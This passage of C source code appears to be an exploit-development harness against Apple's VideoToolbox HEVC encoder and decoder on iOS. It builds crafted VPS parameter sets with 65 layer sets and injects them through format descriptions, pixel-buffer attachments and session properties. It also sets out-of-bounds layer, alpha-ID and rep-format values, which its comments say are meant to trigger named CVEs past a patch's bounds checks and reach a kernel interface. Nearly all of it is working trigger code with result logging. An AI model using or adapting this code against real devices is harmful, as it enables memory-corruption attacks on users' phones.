            if (st != 0) { rlog("FAIL create: %d\n", (int)st); goto done; }

            st = VTCompressionSessionPrepareToEncodeFrames(session);

            /* Build crafted VPS with 65 layer sets */
            uint8_t vps_nal[8192];
            size_t vps_len = build_crafted_vps(vps_nal, sizeof(vps_nal), 65);

            uint8_t sps_nal[256];
            size_t sps_len = build_minimal_sps(sps_nal, sizeof(sps_nal));

            uint8_t pps_nal[128];
            size_t pps_len = build_minimal_pps(pps_nal, sizeof(pps_nal));

            const uint8_t *psets[] = { vps_nal, sps_nal, pps_nal };
            size_t psizes[] = { vps_len, sps_len, pps_len };

            CMFormatDescriptionRef crafted_fmt = NULL;
            st = CMVideoFormatDescriptionCreateFromHEVCParameterSets(
                NULL, 3, psets, psizes, 4, NULL, &crafted_fmt);
            rlog("Crafted format (65 layer sets): %d\n", (int)st);

            /* Create pixel buffer with attachment */
            CVPixelBufferRef pb = NULL;
            CFMutableDictionaryRef pba = CFDictionaryCreateMutable(NULL, 1,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionaryRef empty = CFDictionaryCreate(NULL, NULL, NULL, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(pba, kCVPixelBufferIOSurfacePropertiesKey, empty);
            CFRelease(empty);
            CVPixelBufferCreate(NULL, 128, 128,
                kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, pba, &pb);
            CFRelease(pba);

            if (pb && crafted_fmt) {
                CVBufferSetAttachment(pb, CFSTR("FormatDescription"),
                    crafted_fmt, kCVAttachmentMode_ShouldPropagate);

                /* Also attach raw VPS data */
                CFDataRef vps_data = CFDataCreate(NULL, vps_nal, (CFIndex)vps_len);
                CVBufferSetAttachment(pb, CFSTR("HEVCVideoParameterSet"),
                    vps_data, kCVAttachmentMode_ShouldPropagate);
                CFRelease(vps_data);

                g_encode_done = 0;
                g_cb_count = 0;

                CMTime pts = CMTimeMake(0, 30);
                const void *fp_keys[] = { kVTEncodeFrameOptionKey_ForceKeyFrame };
                const void *fp_vals[] = { kCFBooleanTrue };
                CFDictionaryRef fp = CFDictionaryCreate(NULL, fp_keys, fp_vals, 1,
                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);

                st = VTCompressionSessionEncodeFrame(session, pb,
                    pts, kCMTimeInvalid, fp, NULL, NULL);
                rlog("EncodeFrame: %d\n", (int)st);
                CFRelease(fp);

                for (int w = 0; w < 100 && !g_encode_done; w++) usleep(10000);
                VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);

                rlog("Callback count: %d, status: %d\n", g_cb_count, (int)g_cb_status);

                if (g_saved_fmt) {
                    rlog("Output parameter sets (with crafted attachment):\n");
                    dump_psets(g_saved_fmt, 0);

                    const uint8_t *out_vps = NULL;
                    size_t out_vps_sz = 0;
                    CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
                        g_saved_fmt, 0, &out_vps, &out_vps_sz, NULL, NULL);
                    rlog("Output VPS: %zu bytes (crafted was %zu)\n",
                        out_vps_sz, vps_len);

                    if (out_vps && out_vps_sz > 4) {
                        rlog("  First 32 bytes: ");
                        for (size_t j = 0; j < 32 && j < out_vps_sz; j++)
                            rlog("%02x", out_vps[j]);
                        rlog("\n");

                        if (out_vps_sz == vps_len) {
                            int match = (memcmp(out_vps, vps_nal, vps_len) == 0);
                            rlog("VPS SIZE MATCH! Content %s\n",
                                match ? "IDENTICAL — crafted VPS reached encoder!" :
                                "differs — encoder generated its own");
                        } else {
                            rlog("VPS sizes differ: output=%zu crafted=%zu\n",
                                out_vps_sz, vps_len);
                            rlog("Encoder generated its own VPS (attachment ignored)\n");
                        }
                    }
                    CFRelease(g_saved_fmt);
                    g_saved_fmt = NULL;
                }
                CVPixelBufferRelease(pb);
            }
            if (crafted_fmt) CFRelease(crafted_fmt);
            VTCompressionSessionInvalidate(session);
            CFRelease(session);
        }

        /* Step 3: Try creating encoder with crafted sourceImageBufferAttributes */
        rlog("\n--- Step 3: Encoder with crafted source format ---\n");
        {
            uint8_t vps_nal[8192];
            size_t vps_len = build_crafted_vps(vps_nal, sizeof(vps_nal), 65);
            uint8_t sps_nal[256];
            size_t sps_len = build_minimal_sps(sps_nal, sizeof(sps_nal));
            uint8_t pps_nal[128];
            size_t pps_len = build_minimal_pps(pps_nal, sizeof(pps_nal));

            const uint8_t *psets[] = { vps_nal, sps_nal, pps_nal };
            size_t psizes[] = { vps_len, sps_len, pps_len };

            CMFormatDescriptionRef crafted_fmt = NULL;
            CMVideoFormatDescriptionCreateFromHEVCParameterSets(
                NULL, 3, psets, psizes, 4, NULL, &crafted_fmt);

            if (crafted_fmt) {
                /* Use crafted format's extensions as source attrs */
                CFDictionaryRef exts = CMFormatDescriptionGetExtensions(crafted_fmt);
                rlog("Crafted format extensions: %s\n", exts ? "present" : "NULL");

                if (exts) {
                    CFMutableDictionaryRef src_attrs = CFDictionaryCreateMutableCopy(
                        NULL, 0, exts);

                    VTCompressionSessionRef session = NULL;
                    OSStatus st = VTCompressionSessionCreate(NULL, 128, 128,
                        kCMVideoCodecType_HEVC, NULL, src_attrs, NULL,
                        encode_cb, NULL, &session);
                    rlog("Create with crafted sourceAttrs: %d\n", (int)st);

                    if (st == 0 && session) {
                        st = VTCompressionSessionPrepareToEncodeFrames(session);
                        rlog("Prepare: %d\n", (int)st);

                        g_encode_done = 0;
                        encode_one(session, 0, 128, 128);
                        for (int w = 0; w < 100 && !g_encode_done; w++) usleep(10000);
                        VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);

                        if (g_saved_fmt) {
                            rlog("Output with crafted source attrs:\n");
                            dump_psets(g_saved_fmt, 0);
                            CFRelease(g_saved_fmt);
                            g_saved_fmt = NULL;
                        }
                        VTCompressionSessionInvalidate(session);
                        CFRelease(session);
                    }
                    CFRelease(src_attrs);
                }
                CFRelease(crafted_fmt);
            }
        }

    } else if (strcmp(mode, "xpc_vps") == 0) {
        /*
         * xpc_vps — Attempt to reach mediaserverd's compression XPC service
         * and influence VPS struct fields that get forwarded to kernel sAddClient.
         *
         * Strategy: VideoToolbox caps layers at 2, but the sHEVC_VPS struct
         * has fields (vps_num_layer_sets_minus1, num_add_layer_sets, etc.)
         * that are populated separately from iLayerNum. We test whether
         * setting encoder properties can influence these unvalidated fields.
         */
        int phase = 1;
        if (argc > 2) phase = atoi(argv[2]);

        rlog("=== XPC VPS Field Manipulation Test (phase %d) ===\n\n", phase);

        if (phase == 1) {
            rlog("--- Phase 1: VPS-influencing property scan ---\n");
            rlog("Testing all HEVC encoder properties that may influence VPS fields\n\n");

            /* Create HEVC encoder session */
            VTCompressionSessionRef session = NULL;
            OSStatus st = VTCompressionSessionCreate(NULL, 128, 128,
                kCMVideoCodecType_HEVC, NULL, NULL, NULL,
                NULL, NULL, &session);
            if (st != 0 || !session) {
                rlog("FAIL: create session: %d\n", (int)st);
                goto done;
            }
            rlog("Session created OK\n");

            /* Properties that might influence VPS extension fields */
            struct {
                const char *name;
                CFStringRef key;
                int test_val;
            } vps_props[] = {
                {"MaxLayerCount", CFSTR("MaxLayerCount"), 65},
                {"NumberOfLayers", CFSTR("NumberOfLayers"), 65},
                {"NumLayerSets", CFSTR("NumLayerSets"), 65},
                {"VPSNumLayerSets", CFSTR("VPSNumLayerSets"), 128},
                {"MaxSubLayers", CFSTR("MaxSubLayers"), 7},
                {"HEVCMaxSubLayers", CFSTR("HEVCMaxSubLayers"), 7},
                {"NumAddLayerSets", CFSTR("NumAddLayerSets"), 65},
                {"VPSExtension", CFSTR("VPSExtension"), 1},
                {"MultiLayerHEVC", CFSTR("MultiLayerHEVC"), 1},
                {"LayerSetCount", CFSTR("LayerSetCount"), 128},
                {"MaxLayers", CFSTR("MaxLayers"), 65},
                {"NumOutputLayerSets", CFSTR("NumOutputLayerSets"), 65},
                {"HEVCLayerCount", CFSTR("HEVCLayerCount"), 65},
            };
            int nprop = sizeof(vps_props) / sizeof(vps_props[0]);

            for (int i = 0; i < nprop; i++) {
                CFNumberRef val = CFNumberCreate(NULL, kCFNumberIntType,
                    &vps_props[i].test_val);
                st = VTSessionSetProperty(session,
                    vps_props[i].key, val);
                rlog("  %-30s = %3d → %s (%d)\n",
                    vps_props[i].name, vps_props[i].test_val,
                    st == 0 ? "ACCEPTED" : "rejected", (int)st);
                CFRelease(val);
            }

            /* Try SampleAttachedVPS via raw data property */
            rlog("\n--- Trying raw VPS data injection via properties ---\n");

            uint8_t crafted[8192];
            size_t vps_len = build_crafted_vps(crafted, sizeof(crafted), 65);
            rlog("Built crafted VPS: %zu bytes, 65 layer sets\n", vps_len);

            CFDataRef vps_data = CFDataCreate(NULL, crafted, (CFIndex)vps_len);
            const char *data_keys[] = {
                "SampleAttachedVPS",
                "VideoParameterSet",
                "HEVCVideoParameterSet",
                "RawVPS",
                "VPSData",
                "ParameterSetData",
            };
            for (int i = 0; i < 6; i++) {
                st = VTSessionSetProperty(session,
                    CFStringCreateWithCString(NULL, data_keys[i],
                        kCFStringEncodingUTF8), vps_data);
                rlog("  %-30s data(%zu) → %s (%d)\n",
                    data_keys[i], vps_len,
                    st == 0 ? "ACCEPTED" : "rejected", (int)st);
            }
            CFRelease(vps_data);

            VTCompressionSessionInvalidate(session);
            CFRelease(session);
        }

        if (phase == 2) {
            rlog("--- Phase 2: Direct XPC (not available on iOS) ---\n");
            rlog("xpc_connection_create_mach_service is unavailable on iOS.\n");
            rlog("The sHEVC_VPS struct is populated by mediaserverd internally.\n");
            rlog("Attack surface: VTCompressionSession properties or\n");
            rlog("CMFormatDescription injection (see phases 3-4).\n");
        }

        if (phase == 3) {
            rlog("--- Phase 3: Encode with crafted SPS/PPS injection ---\n");
            rlog("Attempting to inject crafted parameter sets via CMSampleBuffer\n\n");

            VTCompressionSessionRef session = NULL;
            OSStatus st = VTCompressionSessionCreate(NULL, 128, 128,
                kCMVideoCodecType_HEVC, NULL, NULL, NULL,
                NULL, NULL, &session);
            if (st != 0 || !session) {
                rlog("FAIL: create session: %d\n", (int)st);
                goto done;
            }

            /* Set MV-HEVC with 2 layers (max allowed) */
            int layers[] = {0, 1};
            CFMutableArrayRef layerArr = CFArrayCreateMutable(NULL, 2,
                &kCFTypeArrayCallBacks);
            for (int i = 0; i < 2; i++) {
                CFNumberRef n = CFNumberCreate(NULL, kCFNumberIntType, &layers[i]);
                CFArrayAppendValue(layerArr, n);
                CFRelease(n);
            }
            st = VTSessionSetProperty(session,
                CFSTR("MVHEVCVideoLayerIDs"), layerArr);
            CFRelease(layerArr);
            rlog("MVHEVCVideoLayerIDs [0,1]: %d\n", (int)st);

            int left = 0, right = 1;
            CFMutableArrayRef viewArr = CFArrayCreateMutable(NULL, 2,
                &kCFTypeArrayCallBacks);
            CFNumberRef ln = CFNumberCreate(NULL, kCFNumberIntType, &left);
            CFNumberRef rn = CFNumberCreate(NULL, kCFNumberIntType, &right);
            CFArrayAppendValue(viewArr, ln);
            CFArrayAppendValue(viewArr, rn);
            st = VTSessionSetProperty(session,
                CFSTR("MVHEVCViewIDs"), viewArr);
            CFRelease(viewArr); CFRelease(ln); CFRelease(rn);
            rlog("MVHEVCViewIDs [0,1]: %d\n", (int)st);

            st = VTCompressionSessionPrepareToEncodeFrames(session);
            rlog("PrepareToEncodeFrames: %d\n", (int)st);

            /* Build crafted VPS with 65 layer sets */
            uint8_t vps_nal[8192];
            size_t vps_len = build_crafted_vps(vps_nal, sizeof(vps_nal), 65);
            rlog("Crafted VPS NAL: %zu bytes\n", vps_len);

            /* Build minimal SPS and PPS */
            uint8_t sps_nal[256];
            size_t sps_len = build_minimal_sps(sps_nal, sizeof(sps_nal));
            rlog("Minimal SPS NAL: %zu bytes\n", sps_len);

            uint8_t pps_nal[128];
            size_t pps_len = build_minimal_pps(pps_nal, sizeof(pps_nal));
            rlog("Minimal PPS NAL: %zu bytes\n", pps_len);

            /* Create format description with crafted parameter sets */
            const uint8_t *psets[] = { vps_nal, sps_nal, pps_nal };
            size_t psizes[] = { vps_len, sps_len, pps_len };

            CMFormatDescriptionRef fmt = NULL;
            st = CMVideoFormatDescriptionCreateFromHEVCParameterSets(
                NULL, 3, psets, psizes, 4, NULL, &fmt);
            rlog("CreateFromHEVCParameterSets (65 layer sets): %s (%d)\n",
                st == 0 ? "SUCCESS" : "FAIL", (int)st);

            if (st == 0 && fmt) {
                rlog("Format description created with crafted VPS!\n");

                /* Create a CMSampleBuffer with this format and try to decode */
                /* First create a minimal IDR slice NAL */
                uint8_t idr[] = {
                    0x00, 0x00, 0x00, 0x04,
                    0x26, 0x01, 0xAF, 0x09
                };

                CMBlockBufferRef block = NULL;
                st = CMBlockBufferCreateWithMemoryBlock(NULL,
                    idr, sizeof(idr), NULL, NULL, 0, sizeof(idr), 0, &block);
                rlog("CMBlockBuffer: %d\n", (int)st);

                if (st == 0 && block) {
                    CMSampleBufferRef sample = NULL;
                    CMSampleTimingInfo timing = {
                        .duration = CMTimeMake(1, 30),
                        .presentationTimeStamp = CMTimeMake(0, 30),
                        .decodeTimeStamp = kCMTimeInvalid
                    };
                    size_t ssize = sizeof(idr);
                    st = CMSampleBufferCreate(NULL, block, true, NULL, NULL,
                        fmt, 1, 1, &timing, 1, &ssize, &sample);
                    rlog("CMSampleBuffer with crafted fmt: %d\n", (int)st);

                    if (st == 0 && sample) {
                        rlog("SUCCESS: Created sample with 65-layer-set VPS!\n");

                        /* Try to create VTDecompressionSession with this format */
                        VTDecompressionSessionRef decomp = NULL;
                        VTDecompressionOutputCallbackRecord cb = {NULL, NULL};
                        st = VTDecompressionSessionCreate(NULL, fmt,
                            NULL, NULL, &cb, &decomp);
                        rlog("VTDecompressionSession with crafted fmt: %s (%d)\n",
                            st == 0 ? "SUCCESS" : "FAIL", (int)st);

                        if (st == 0 && decomp) {
                            rlog("CRITICAL: Decoder accepted crafted VPS!\n");
                            rlog("Attempting to decode frame...\n");

                            VTDecodeFrameFlags flags = 0;
                            VTDecodeInfoFlags info = 0;
                            st = VTDecompressionSessionDecodeFrame(decomp,
                                sample, flags, NULL, &info);
                            rlog("DecodeFrame: %d (info=0x%x)\n",
                                (int)st, (unsigned)info);

                            VTDecompressionSessionInvalidate(decomp);
                            CFRelease(decomp);
                        }

                        CFRelease(sample);
                    }
                    CFRelease(block);
                }
                CFRelease(fmt);
            }

            VTCompressionSessionInvalidate(session);
            CFRelease(session);
        }

        if (phase >= 4) {
            rlog("--- Phase 4: Format description re-injection into encoder ---\n");
            rlog("Testing if encoder accepts frames with crafted format descriptions\n\n");

            /* Build crafted VPS with overflow count */
            uint8_t vps_nal[8192];
            size_t vps_len = build_crafted_vps(vps_nal, sizeof(vps_nal), 65);

            uint8_t sps_nal[256];
            size_t sps_len = build_minimal_sps(sps_nal, sizeof(sps_nal));

            uint8_t pps_nal[128];
            size_t pps_len = build_minimal_pps(pps_nal, sizeof(pps_nal));

            /* Create format description with crafted parameter sets */
            const uint8_t *psets[] = { vps_nal, sps_nal, pps_nal };
            size_t psizes[] = { vps_len, sps_len, pps_len };

            CMFormatDescriptionRef crafted_fmt = NULL;
            OSStatus st = CMVideoFormatDescriptionCreateFromHEVCParameterSets(
                NULL, 3, psets, psizes, 4, NULL, &crafted_fmt);
            rlog("Crafted format (65 layer sets): %s (%d)\n",
                st == 0 ? "OK" : "FAIL", (int)st);

            if (st != 0 || !crafted_fmt) {
                rlog("Cannot create crafted format\n");
                goto done;
            }

            /* Create encoder session */
            VTCompressionSessionRef session = NULL;
            st = VTCompressionSessionCreate(NULL, 128, 128,
                kCMVideoCodecType_HEVC, NULL, NULL, NULL,
                NULL, NULL, &session);
            if (st != 0) {
                rlog("Session create: %d\n", (int)st);
                CFRelease(crafted_fmt);
                goto done;
            }

            st = VTCompressionSessionPrepareToEncodeFrames(session);
            rlog("Prepare: %d\n", (int)st);

            /* Create pixel buffer and tag it with our crafted format */
            CVPixelBufferRef pb = NULL;
            CFMutableDictionaryRef pba = CFDictionaryCreateMutable(NULL, 3,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionaryRef empty = CFDictionaryCreate(NULL, NULL, NULL, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(pba, kCVPixelBufferIOSurfacePropertiesKey, empty);
            CFRelease(empty);
            CVReturn cvr = CVPixelBufferCreate(NULL, 128, 128,
                kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                pba, &pb);
            CFRelease(pba);

            if (cvr != 0 || !pb) {
                rlog("PixelBuffer create: %d\n", (int)cvr);
            } else {
                /* Attach crafted format description as an attachment */
                CVBufferSetAttachment(pb,
                    CFSTR("FormatDescription"), crafted_fmt,
                    kCVAttachmentMode_ShouldPropagate);

                /* Also try attaching raw VPS data */
                CFDataRef vps_data = CFDataCreate(NULL, vps_nal, (CFIndex)vps_len);
                CVBufferSetAttachment(pb,
                    CFSTR("HEVCVideoParameterSet"), vps_data,
                    kCVAttachmentMode_ShouldPropagate);
                CFRelease(vps_data);

                rlog("Attached crafted format + VPS to pixel buffer\n");

                /* Encode the tagged pixel buffer */
                CMTime pts = CMTimeMake(0, 30);
                const void *fp_keys[] = { kVTEncodeFrameOptionKey_ForceKeyFrame };
                const void *fp_vals[] = { kCFBooleanTrue };
                CFDictionaryRef frame_props = CFDictionaryCreate(NULL,
                    fp_keys, fp_vals, 1,
                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                st = VTCompressionSessionEncodeFrame(session, pb,
                    pts, kCMTimeInvalid, frame_props, NULL, NULL);
                rlog("EncodeFrame with crafted attachments: %d\n", (int)st);

                /* Flush and check */
                st = VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
                rlog("CompleteFrames: %d\n", (int)st);

                CVPixelBufferRelease(pb);
            }

            CFRelease(crafted_fmt);
            VTCompressionSessionInvalidate(session);
            CFRelease(session);
        }

    } else if (strcmp(mode, "vps_props") == 0) {
        /*
         * vps_props — CVE-2026-114025 trigger via VPS extension properties
         *
         * The 27.2 patch (AVE_HEVC_CheckVPSExtBounds) adds bounds checks on:
         *   vps_num_rep_formats_minus1 < 2
         *   vps_max_layer_id < 63
         *   vps_num_layer_sets_minus1 < 16
         *   num_add_layer_sets <= 64
         *   vps_max_sub_layers_minus1 < 7
         *   vps_num_hrd_parameters <= 16
         *
         * These VPS fields are populated by PSGen based on session properties.
         * CVE-2026-112705 proved that VT properties pass unchecked to kernel.
         *
         * This test sets VPS-influencing properties to values that exceed the
         * bounds added in 27.2, then encodes to trigger PSGen VPS generation.
         *
         * Phase 1: Enumerate which VPS properties are accepted
         * Phase 2: Set RepFormat arrays with >2 entries
         * Phase 3: Set AlphaLayerID >= 63
         * Phase 4: Combine MV-HEVC layers + alpha + temporal layers
         * Phase 5: HEVC-with-alpha codec type (separate VPS layer path)
         */
        int phase = (argc > 2) ? atoi(argv[2]) : 0;
        int unsafe = (argc > 3 && strcmp(argv[3], "unsafe") == 0);

        rlog("=== VPS_PROPS: CVE-2026-114025 VPS property trigger ===\n");
        rlog("Phase: %d, Unsafe: %d\n\n", phase, unsafe);

        int w = 1280, h = 720;

        if (phase == 0 || phase == 1) {
            rlog("--- Phase 1: Property acceptance scan ---\n");
            VTCompressionSessionRef s = NULL;
            CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(enc_spec,
                CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
            CFDictionarySetValue(enc_spec,
                CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);

            OSStatus st = VTCompressionSessionCreate(NULL, w, h,
                kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, encode_cb, NULL, &s);
            CFRelease(enc_spec);
            rlog("Session create: %d\n", (int)st);
            if (st != noErr || !s) goto vps_props_done;

            /* Test RequiredHEVC VPS properties */
            const char *vps_props[] = {
                "RequiredHEVCVideoParameterSetAlphaLayerID",
                "RequiredHEVCSequenceParameterSetRepFormatIndex",
                "RequiredHEVCSequenceParameterSetID",
                "RequiredHEVCPictureParameterSetID",
                "UserParameterSetsIds",
                "EncodesAlpha",
                "EncodesDepth",
                "EncodesDisparity",
                "TemporalIDNestingFlag",
                "NumberOfTemporalLayers",
                "NumOfTemporalLayer",
            };
            int n_props = sizeof(vps_props) / sizeof(vps_props[0]);

            for (int i = 0; i < n_props; i++) {
                /* Test with value 0 */
                int val0 = 0;
                CFNumberRef n0 = CFNumberCreate(NULL, kCFNumberIntType, &val0);
                OSStatus sp = VTSessionSetProperty(s, CFStringCreateWithCString(NULL,
                    vps_props[i], kCFStringEncodingUTF8), n0);
                CFRelease(n0);
                rlog("  %s = 0: %d\n", vps_props[i], (int)sp);

                /* Test with value 1 */
                int val1 = 1;
                CFNumberRef n1 = CFNumberCreate(NULL, kCFNumberIntType, &val1);
                sp = VTSessionSetProperty(s, CFStringCreateWithCString(NULL,
                    vps_props[i], kCFStringEncodingUTF8), n1);
                CFRelease(n1);
                rlog("  %s = 1: %d\n", vps_props[i], (int)sp);

                /* Test with value 64 (past bounds) */
                int val64 = 64;
                CFNumberRef n64 = CFNumberCreate(NULL, kCFNumberIntType, &val64);
                sp = VTSessionSetProperty(s, CFStringCreateWithCString(NULL,
                    vps_props[i], kCFStringEncodingUTF8), n64);
                CFRelease(n64);
                rlog("  %s = 64: %d\n", vps_props[i], (int)sp);
            }

            /* Test array properties */
            rlog("\n  --- Array properties ---\n");
            const char *arr_props[] = {
                "RequiredHEVCVideoParameterSetRepFormatBitDepths",
                "RequiredHEVCVideoParameterSetRepFormatChromaFormatIdcs",
                "HEVCAuxiliaryLayerIDs",
                "HEVCAuxiliaryIDs",
                "RequiredMVHEVCVideoParameterSetAlphaVideoLayerIDs",
                "RequiredMVHEVCSequenceParameterSetIDs",
                "RequiredMVHEVCPictureParameterSetIDs",
                "MVHEVCVideoLayerIDs",
                "MVHEVCViewIDs",
            };
            int n_arr = sizeof(arr_props) / sizeof(arr_props[0]);

            for (int i = 0; i < n_arr; i++) {
                /* Test with 2-element array [8, 10] */
                int vals2[] = {8, 10};
                CFNumberRef nums2[2];
                for (int j = 0; j < 2; j++)
                    nums2[j] = CFNumberCreate(NULL, kCFNumberIntType, &vals2[j]);
                CFArrayRef a2 = CFArrayCreate(NULL, (const void **)nums2, 2,
                    &kCFTypeArrayCallBacks);
                OSStatus sp = VTSessionSetProperty(s, CFStringCreateWithCString(NULL,
                    arr_props[i], kCFStringEncodingUTF8), a2);
                CFRelease(a2);
                for (int j = 0; j < 2; j++) CFRelease(nums2[j]);
                rlog("  %s [2]: %d\n", arr_props[i], (int)sp);

                /* Test with 4-element array (exceeds rep_formats bound of 2) */
                int vals4[] = {8, 10, 12, 8};
                CFNumberRef nums4[4];
                for (int j = 0; j < 4; j++)
                    nums4[j] = CFNumberCreate(NULL, kCFNumberIntType, &vals4[j]);
                CFArrayRef a4 = CFArrayCreate(NULL, (const void **)nums4, 4,
                    &kCFTypeArrayCallBacks);
                sp = VTSessionSetProperty(s, CFStringCreateWithCString(NULL,
                    arr_props[i], kCFStringEncodingUTF8), a4);
                CFRelease(a4);
                for (int j = 0; j < 4; j++) CFRelease(nums4[j]);
                rlog("  %s [4]: %d\n", arr_props[i], (int)sp);

                /* Test with 8-element array */
                int vals8[] = {0, 1, 2, 3, 4, 5, 6, 7};
                CFNumberRef nums8[8];
                for (int j = 0; j < 8; j++)
                    nums8[j] = CFNumberCreate(NULL, kCFNumberIntType, &vals8[j]);
                CFArrayRef a8 = CFArrayCreate(NULL, (const void **)nums8, 8,
                    &kCFTypeArrayCallBacks);
                sp = VTSessionSetProperty(s, CFStringCreateWithCString(NULL,
                    arr_props[i], kCFStringEncodingUTF8), a8);
                CFRelease(a8);
                for (int j = 0; j < 8; j++) CFRelease(nums8[j]);
                rlog("  %s [8]: %d\n", arr_props[i], (int)sp);
            }

            VTCompressionSessionInvalidate(s);
            CFRelease(s);
        }

        if (phase == 0 || phase == 2) {
            rlog("\n--- Phase 2: RepFormat array overflow (>2 entries) ---\n");
            rlog("27.2 check: vps_num_rep_formats_minus1 < 2\n");

            int rep_counts[] = {1, 2, 3, 4, 8, 16};
            int n_rep = sizeof(rep_counts) / sizeof(rep_counts[0]);

            for (int r = 0; r < n_rep; r++) {
                int nrep = rep_counts[r];
                rlog("  rep_formats=%d: ", nrep);

                VTCompressionSessionRef s = NULL;
                CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                CFDictionarySetValue(enc_spec,
                    CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
                CFDictionarySetValue(enc_spec,
                    CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);

                OSStatus st = VTCompressionSessionCreate(NULL, w, h,
                    kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, encode_cb, NULL, &s);
                CFRelease(enc_spec);
                if (st != noErr || !s) {
                    rlog("session fail\n");
                    continue;
                }

                VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);

                /* Set RepFormatBitDepths array with nrep entries */
                CFNumberRef *repnums = calloc(nrep, sizeof(CFNumberRef));
                const void **repptrs = calloc(nrep, sizeof(void *));
                for (int j = 0; j < nrep; j++) {
                    int bd = 8 + (j % 3) * 2;
                    repnums[j] = CFNumberCreate(NULL, kCFNumberIntType, &bd);
                    repptrs[j] = repnums[j];
                }
                CFArrayRef reparr = CFArrayCreate(NULL, repptrs, nrep,
                    &kCFTypeArrayCallBacks);
                OSStatus sp = VTSessionSetProperty(s,
                    CFSTR("RequiredHEVCVideoParameterSetRepFormatBitDepths"), reparr);
                CFRelease(reparr);
                for (int j = 0; j < nrep; j++) CFRelease(repnums[j]);
                free(repnums); free(repptrs);
                rlog("set=%d, ", (int)sp);

                /* Prepare and encode */
                st = VTCompressionSessionPrepareToEncodeFrames(s);
                rlog("prepare=%d", (int)st);

                if (st == noErr) {
                    g_encode_done = 0;
                    encode_one(s, 0, w, h);
                    for (int ww = 0; ww < 300 && !g_encode_done; ww++) usleep(10000);
                    rlog(", encode=%d, psets=%zu", (int)g_cb_status, g_last_pset_count);
                }
                rlog("\n");

                VTCompressionSessionInvalidate(s);
                CFRelease(s);
            }
        }

        if (phase == 0 || phase == 3) {
            rlog("\n--- Phase 3: AlphaLayerID >= 63 ---\n");
            rlog("27.2 check: vps_max_layer_id < 63\n");

            int alpha_ids[] = {0, 1, 32, 62, 63, 64, 127, 255};
            int n_alpha = sizeof(alpha_ids) / sizeof(alpha_ids[0]);

            for (int a = 0; a < n_alpha; a++) {
                int aid = alpha_ids[a];
                rlog("  AlphaLayerID=%d: ", aid);

                VTCompressionSessionRef s = NULL;
                CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                CFDictionarySetValue(enc_spec,
                    CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
                CFDictionarySetValue(enc_spec,
                    CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);

                OSStatus st = VTCompressionSessionCreate(NULL, w, h,
                    kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, encode_cb, NULL, &s);
                CFRelease(enc_spec);
                if (st != noErr || !s) {
                    rlog("session fail\n");
                    continue;
                }

                VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);

                /* Enable alpha encoding */
                VTSessionSetProperty(s, CFSTR("EncodesAlpha"), kCFBooleanTrue);

                /* Set AlphaLayerID */
                CFNumberRef aidn = CFNumberCreate(NULL, kCFNumberIntType, &aid);
                OSStatus sp = VTSessionSetProperty(s,
                    CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), aidn);
                CFRelease(aidn);
                rlog("set=%d, ", (int)sp);

                /* Prepare and encode */
                st = VTCompressionSessionPrepareToEncodeFrames(s);
                rlog("prepare=%d", (int)st);

                if (st == noErr) {
                    g_encode_done = 0;
                    encode_one(s, 0, w, h);
                    for (int ww = 0; ww < 300 && !g_encode_done; ww++) usleep(10000);
                    rlog(", encode=%d, psets=%zu", (int)g_cb_status, g_last_pset_count);
                }
                rlog("\n");

                VTCompressionSessionInvalidate(s);
                CFRelease(s);
            }
        }

        if (phase == 0 || phase == 4) {
            rlog("\n--- Phase 4: Combined MV-HEVC + Alpha + Temporal ---\n");
            rlog("Goal: maximize VPS extension field values simultaneously\n");

            VTCompressionSessionRef s = NULL;
            CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(enc_spec,
                CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
            CFDictionarySetValue(enc_spec,
                CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);

            OSStatus st = VTCompressionSessionCreate(NULL, w, h,
                kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, encode_cb, NULL, &s);
            CFRelease(enc_spec);
            rlog("Session create: %d\n", (int)st);
            if (st != noErr || !s) goto vps_props_done;

            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);

            /* MV-HEVC layer IDs [0, 1] */
            int layers[] = {0, 1};
            CFNumberRef ln[2];
